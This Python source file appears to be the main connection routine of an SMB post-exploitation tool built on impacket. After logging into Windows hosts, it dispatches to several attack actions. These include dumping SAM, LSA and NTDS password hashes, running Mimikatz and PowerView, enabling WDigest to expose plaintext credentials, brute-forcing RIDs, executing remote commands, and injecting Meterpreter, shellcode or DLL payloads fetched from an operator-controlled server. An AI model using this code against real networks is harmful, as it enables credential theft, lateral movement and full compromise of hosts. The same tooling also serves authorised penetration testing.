from logger import *
from powershell import *
from impacket.nmb import NetBIOSError
from impacket.smbconnection import SMBConnection, SessionError
from impacket.dcerpc.v5.rpcrt import DCERPCException
from executor import EXECUTOR
from sharedump import SHAREDUMP
from scripts.wmiquery import WMIQUERY
from scripts.samrdump import SAMRDump
from scripts.lookupsid import LSALookupSid
from scripts.secretsdump import DumpSecrets
from scripts.services import SVCCTL
from passpoldump import PassPolDump
from rpcquery import RPCQUERY
from smbspider import SMBSPIDER
from uacdump import UACdump
from wdigestenable import WdisgestEnable
from smartlogin import smart_login
from remotefilesystem import RemoteFileSystem
from datetime import datetime
import os
import socket
import settings
import traceback
import socket

def connect(host):
    '''
        My imagination flowed free when coming up with this name
        This is where all the magic happens
    '''

    try:

        smb = SMBConnection(host, host, None, settings.args.port)
        try:
            smb.login('' , '')
        except SessionError as e:
            if "STATUS_ACCESS_DENIED" in e.message:
                pass

        domain = settings.args.domain
        s_name = smb.getServerName()
        if not domain:
            domain = smb.getServerDomain()
            if not domain:
                domain = s_name

        print_status(u"{}:{} is running {} (name:{}) (domain:{})".format(host, settings.args.port, smb.getServerOS(), s_name, domain))

        try:
            '''
                DC's seem to want us to logoff first
                Windows workstations sometimes reset the connection, so we handle both cases here
                (go home Windows, you're drunk)
            '''
            smb.logoff()
        except NetBIOSError:
            pass
        except socket.error:
            smb = SMBConnection(host, host, None, settings.args.port)

        if (settings.args.user is not None and (settings.args.passwd is not None or settings.args.hash is not None)) or settings.args.combo_file:

            smb = smart_login(host, smb, domain)
            #Get our IP from the socket
            local_ip = smb.getSMBServer().get_socket().getsockname()[0]

            if settings.args.delete or settings.args.download or settings.args.list or settings.args.upload:
                rfs = RemoteFileSystem(host, smb)
                if settings.args.delete:
                    rfs.delete()
                if settings.args.download:
                    rfs.download()
                if settings.args.upload:
                    rfs.upload()
                if settings.args.list:
                    rfs.list()

            if settings.args.enum_shares:
                shares = SHAREDUMP(smb)
                shares.dump(host)

            if settings.args.enum_users:
                users = SAMRDump('{}/SMB'.format(settings.args.port),
                                 settings.args.user, 
                                 settings.args.passwd, 
                                 domain, 
                                 settings.args.hash, 
                                 settings.args.aesKey,
                                 settings.args.kerb)
                users.dump(host)

            if settings.args.sam or settings.args.lsa or settings.args.ntds:
                dumper = DumpSecrets(host,
                                     settings.args.port,
                                     'logs/{}'.format(host),
                                     smb,
                                     settings.args.kerb)

                dumper.do_remote_ops()
                if settings.args.sam:
                    dumper.dump_SAM()
                if settings.args.lsa:
                    dumper.dump_LSA()
                if settings.args.ntds:
                    dumper.dump_NTDS(settings.args.ntds,
                                     settings.args.ntds_history,
                                     settings.args.ntds_pwdLastSet)
                dumper.cleanup()

            if settings.args.pass_pol:
                pass_pol = PassPolDump('{}/SMB'.format(settings.args.port),
                                 settings.args.user, 
                                 settings.args.passwd, 
                                 domain, 
                                 settings.args.hash, 
                                 settings.args.aesKey,
                                 settings.args.kerb)
                pass_pol.dump(host)

            if settings.args.rid_brute:
                lookup = LSALookupSid(settings.args.user,
                                      settings.args.passwd,
                                      domain,
                                      '{}/SMB'.format(settings.args.port), 
                                      settings.args.hash, 
                                      settings.args.rid_brute)
                lookup.dump(host)

            if settings.args.enum_sessions or settings.args.enum_disks or settings.args.enum_lusers:
                rpc_query = RPCQUERY(settings.args.user, 
                                     settings.args.passwd, 
                                     domain, 
                                     settings.args.hash)

                if settings.args.enum_sessions:
                    rpc_query.enum_sessions(host)
                if settings.args.enum_disks:
                    rpc_query.enum_disks(host)
                if settings.args.enum_lusers:
                    rpc_query.enum_lusers(host)

            if settings.args.spider:
                smb_spider = SMBSPIDER(host, smb)
                smb_spider.spider(settings.args.spider, settings.args.depth)
                smb_spider.finish()

            if settings.args.wmi_query:
                wmi_query = WMIQUERY(settings.args.user, 
                                     settings.args.passwd, 
                                     domain, 
                                     settings.args.hash,
                                     settings.args.kerb,
                                     settings.args.aesKey)

                wmi_query.run(settings.args.wmi_query, host, settings.args.namespace)

            if settings.args.check_uac:
                uac = UACdump(smb, settings.args.kerb)
                uac.run()

            if settings.args.enable_wdigest:
                wdigest = WdisgestEnable(smb, settings.args.kerb)
                wdigest.enable()

            if settings.args.disable_wdigest:
                wdigest = WdisgestEnable(smb, settings.args.kerb)
                wdigest.disable()

            if settings.args.service:
                service_control = SVCCTL(settings.args.user, 
                                         settings.args.passwd, 
                                         domain,
                                         '{}/SMB'.format(settings.args.port),
                                         settings.args.service, 
                                         settings.args)
                service_control.run(host)

            if settings.args.command:
                EXECUTOR(settings.args.command, host, domain, settings.args.no_output, smb, settings.args.execm)

            if settings.args.pscommand:
                EXECUTOR(ps_command(settings.args.pscommand), host, domain, settings.args.no_output, smb, settings.args.execm)

            if settings.args.mimikatz:
                powah_command = PowerShell(settings.args.server, local_ip)
                EXECUTOR(powah_command.mimikatz(), host, domain, True, smb, settings.args.execm)

            if settings.args.mimikatz_cmd:
                powah_command = PowerShell(settings.args.server, local_ip)
                EXECUTOR(powah_command.mimikatz(settings.args.mimikatz_cmd), host, domain, True, smb, settings.args.execm)

            if settings.args.powerview:
                #For some reason powerview functions only seem to work when using smbexec...
                #I think we might have a mistery on our hands boys and girls!
                powah_command = PowerShell(settings.args.server, local_ip)
                EXECUTOR(powah_command.powerview(settings.args.powerview), host, domain, True, smb, 'smbexec')

            if settings.args.inject:
                powah_command = PowerShell(settings.args.server, local_ip)
                if settings.args.inject.startswith('met_'):
                    EXECUTOR(powah_command.inject_meterpreter(), host, domain, True, smb, settings.args.execm)

                if settings.args.inject == 'shellcode':
                    EXECUTOR(powah_command.inject_shellcode(), host, domain, True, smb, settings.args.execm)

                if settings.args.inject == 'dll' or settings.args.inject == 'exe':
                    EXECUTOR(powah_command.inject_exe_dll(), host, domain, True, smb, settings.args.execm)
        try:
            smb.logoff()
        except:
            pass

    except SessionError as e:
        print_error("{}:{} {}".format(host, settings.args.port, e))
        if settings.args.verbose: traceback.print_exc()

    except NetBIOSError as e:
        print_error("{}:{} NetBIOS Error: {}".format(host, settings.args.port, e))
        if settings.args.verbose: traceback.print_exc()

    except DCERPCException as e:
        print_error("{}:{} DCERPC Error: {}".format(host, settings.args.port, e))
        if settings.args.verbose: traceback.print_exc()

    except socket.error as e:
        if settings.args.verbose: print_error(str(e))
        return
